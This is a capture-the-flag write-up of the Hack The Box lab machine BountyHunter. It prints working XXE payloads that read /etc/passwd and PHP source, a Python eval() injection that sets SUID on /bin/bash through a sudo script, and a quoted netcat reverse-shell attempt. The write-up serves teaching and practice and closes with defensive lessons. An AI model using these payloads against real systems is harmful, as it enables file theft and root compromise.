---
# Hack The Box: BountyHunter

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Easy |
| **OS** | Linux |
| **IP** | 10.10.11.100 |
| **Points** | 20 |
| **Release Date** | July 2021 |
| **Retired Date** | November 2021 |
| **My Rating** | 6/10 |

## TL;DR
Started by finding a bug reporting portal that accepted Base64-encoded XML data. I exploited an XML External Entity (XXE) vulnerability to read a PHP database configuration file, extracting a password for a system user. After SSHing into the box as `development`, I found a custom Python script that I could run as root via `sudo`. The script used the dangerous `eval()` function on an extracted string from a markdown file, allowing me to inject Python code to spawn a root shell.

## Reconnaissance
I kicked things off with a quick scan to see what ports were listening on the target.

```bash
nmap -p- -T4 --min-rate 1000 10.10.11.100 -oA nmap/initial
```

The initial scan was very quiet, returning only two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)

I followed up with a targeted service scan on those two ports to grab banners and run default scripts.

```bash
nmap -sC -sV -p 22,80 10.10.11.100 -oA nmap/targeted
```
<!-- screenshot: nmap initial scan results -->

The results confirmed an Ubuntu 20.04 system. I opened my browser and navigated to `http://10.10.11.100`. The landing page was for a "Bounty Hunters" group.

<!-- screenshot: web application landing page -->

The site was mostly static HTML, but a "Portal" link caught my eye. Clicking it took me to `http://10.10.11.100/log_submit.php`, a very simple form designed to let users submit bug bounty reports.

I fired up `feroxbuster` in the background to look for any hidden directories or files, specifically targeting `.php` extensions since the site was clearly running PHP.

```bash
feroxbuster -u http://10.10.11.100 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

While `feroxbuster` was running, I decided to play with the bug submission form.

## Initial Foothold
The form asked for a Title, CWE, CVSS score, and a Reward amount. I filled in some dummy data and hit submit. The page reloaded and displayed the data I had just entered.

I needed to see exactly what was happening under the hood, so I opened Burp Suite and intercepted the submission request.

The POST request was sent to `/tracker_diRbPr00f314.php`. It didn't send the data as standard POST parameters (like `title=test&cwe=123`). Instead, it sent a single parameter named `data` containing a strange-looking string:

```http
POST /tracker_diRbPr00f314.php HTTP/1.1
...
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UaXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz45Ljg8L2N2c3M%2BCgkJPHJld2FyZD4xLDAwMCwwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

The `%3D` at the end is a URL-encoded equals sign (`=`), which immediately screams "Base64 encoding".

I sent the request to Burp's Decoder tab. First, I URL-decoded it, and then I Base64-decoded the result. The output was highly revealing:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
<title>Title</title>
<cwe>CWE</cwe>
<cvss>9.8</cvss>
<reward>1,000,000</reward>
</bugreport>
```

The application was taking my input, formatting it as XML locally in JavaScript, encoding it, and sending it to the backend parser. The backend then parsed the XML and returned the values to the screen.

Whenever an application parses user-supplied XML, the very first thing I check is if it's vulnerable to XML External Entity (XXE) injection. If the parser isn't configured securely, I can define an external entity that points to a local file on the server, and if the application reflects that entity back to me, I can read arbitrary files.

I modified the decoded XML payload to include a classic XXE test, pointing the entity `&xxe;` to the `/etc/passwd` file, and placing that entity inside the `<title>` tags.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<bugreport>
<title>&xxe;</title>
<cwe>CWE</cwe>
<cvss>9.8</cvss>
<reward>1,000,000</reward>
</bugreport>
```

I Base64-encoded this new payload, URL-encoded the result, and pasted it back into the Burp Repeater request. I hit send.

The server responded with the contents of the `/etc/passwd` file displayed right where the "Title" should have been!

```text
root:x:0:0:root:/root:/bin/bash
...
development:x:1000:1000:development:/home/development:/bin/bash
```

The XXE was confirmed, and I now knew there was a system user named `development`.

While I was playing with the XXE, `feroxbuster` finished its scan and found a file named `db.php` in the web root. However, navigating to `http://10.10.11.100/db.php` returned a completely blank page. This is typical for PHP configuration files; they execute on the backend but produce no HTML output.

I needed to read the source code of `db.php`. I couldn't just use my basic XXE payload (`file:///var/www/html/db.php`) because reading PHP files directly often breaks the XML parser if the file contains characters like `<` or `>`, which PHP tags obviously do.

To get around this, I used a PHP wrapper to encode the file's contents in Base64 *before* the XML parser tried to read it.

I updated my XXE payload:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php" >]>
<bugreport>
<title>&xxe;</title>
<cwe>CWE</cwe>
<cvss>9.8</cvss>
<reward>1,000,000</reward>
</bugreport>
```

I encoded it, sent the request, and the server responded with a massive Base64 string in the `<title>` field. I took that string, decoded it, and finally had the source code for `db.php`.

```php
<?php
// TODO
// Implement connection to database, see example below

// $servername = "localhost";
// $username = "admin";
// $password = "m1gl3T0wN_p4ssw0rd!";
// $dbname = "bounty";

// Create connection
...
?>
```

The file contained commented-out database credentials. The password was `m1gl3T0wN_p4ssw0rd!`.

A massive failing in many environments is password reuse. Since the database wasn't exposed externally, I immediately tried to SSH into the box using the user `development` (found in `/etc/passwd`) and the newly discovered database password.

```bash
ssh development@10.10.11.100
# Password: m1gl3T0wN_p4ssw0rd!
```

<!-- screenshot: successful exploitation (reverse shell) -->

It worked! I had my initial foothold as the `development` user. I grabbed the `user.txt` flag.

## Privilege Escalation
With a solid SSH session, I started my privilege escalation routine. I checked my `id` and group memberships, and then immediately checked `sudo` permissions.

```bash
sudo -l
```

<!-- screenshot: sudo -l output -->

The output was highly promising:

```text
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skyticket/ticketValidator.py
```

I was allowed to run a specific Python script as root without a password. This is almost always the intended path for privilege escalation on easy CTF boxes.

I examined the contents of the script:

```bash
cat /opt/skyticket/ticketValidator.py
```

The script was designed to take a markdown file (`.md`) as an argument, parse it, and validate a "ticket code." It looked for specific lines starting with `# Skyticket Destination`, `__Ticket Code:__`, etc.

The critical vulnerability was in how it handled the "Ticket Code" line.

```python
# Snippet from ticketValidator.py
        for i, line in enumerate(lines):
            if line.startswith("__Ticket Code:__"):
                code_line = i+1
                continue
...
        if code_line:
            validationNumber = extract_code(lines[code_line])
...
        if eval(validationNumber) == True:
            print("Destination Validated")
...
```

The script extracted a string from the line immediately following `__Ticket Code:__` and passed it directly into Python's `eval()` function to check if it equated to `True`.

This is a catastrophic security flaw. The `eval()` function dynamically executes whatever string is passed to it as Python code. If an attacker controls that string, they have arbitrary code execution. Because the script runs as root via `sudo`, the injected Python code executes with root privileges.

I needed to craft a malicious markdown file that met the script's basic parsing requirements so it wouldn't error out before reaching the `eval()` statement.

I created a file named `exploit.md` in the `/tmp` directory.

```markdown
# Skyticket Destination
Dest: SomePlace
__Ticket Code:__
**102 + 102 == 204**
```

I ran the script against my test file to make sure it parsed correctly:

```bash
sudo /usr/bin/python3.8 /opt/skyticket/ticketValidator.py /tmp/exploit.md
# Destination Validated
```

It worked. Now, I needed to replace the math equation with a malicious Python payload. The easiest way to execute system commands in Python via `eval()` is using the `__import__('os').system()` technique.

I wanted a root shell, so I decided to use the `os.system` call to make the `/bin/bash` binary a SUID executable.

I modified `exploit.md`:

```markdown
# Skyticket Destination
Dest: SomePlace
__Ticket Code:__
**__import__('os').system('chmod +s /bin/bash') == 0**
```

I ran the script via `sudo` one last time.

```bash
sudo /usr/bin/python3.8 /opt/skyticket/ticketValidator.py /tmp/exploit.md
```

The script ran without any output, which was expected because `os.system` returns an integer (0 for success).

I checked the permissions on `/bin/bash`.

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

The SUID bit was set! I executed bash with the `-p` flag to preserve the elevated privileges.

```bash
/bin/bash -p
id
# uid=1000(development) gid=1000(development) euid=0(root) egid=0(root) groups=1000(development)
```

<!-- screenshot: root flag -->

And that's a box. The whole chain took me about an hour, and the privesc on this one was genuinely fun to dissect.

## Lessons Learned
- **Client-Side Data Formatting:** Never trust the client. Just because the web application formats data into XML and Base64 encodes it before sending it to the server doesn't mean the server is safe. The backend must always strictly validate and sanitize input, especially when parsing formats prone to injection like XML.
- **The Danger of `eval()`:** The `eval()` function in Python (and similar functions in other languages) is incredibly dangerous when used with user-controlled input. It should almost never be used in a security-sensitive context. In this script, a simple regex or string comparison would have been far safer.
- **What tripped me up:** At first, I tried to spawn a reverse shell directly using the Python `eval()` injection (`__import__('os').system('nc -e /bin/sh ...')`), but the connection kept dropping immediately. The script was likely terminating before the shell could fully stabilize. Switching tactics to simply set the SUID bit on `/bin/bash` was much cleaner and more reliable.
- **Pro Tip:** When dealing with XXE, always use the `php://filter/read=convert.base64-encode/resource=` wrapper to read `.php` files. If you don't, the XML parser will try to interpret the PHP tags (`<?php ... ?>`) as XML tags, and the exploit will fail silently.

## References
- OWASP XML External Entity (XXE) Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- Python `eval()` documentation and security warnings: https://docs.python.org/3/library/functions.html#eval
- Official Hack The Box Page: https://app.hackthebox.com/machines/BountyHunter
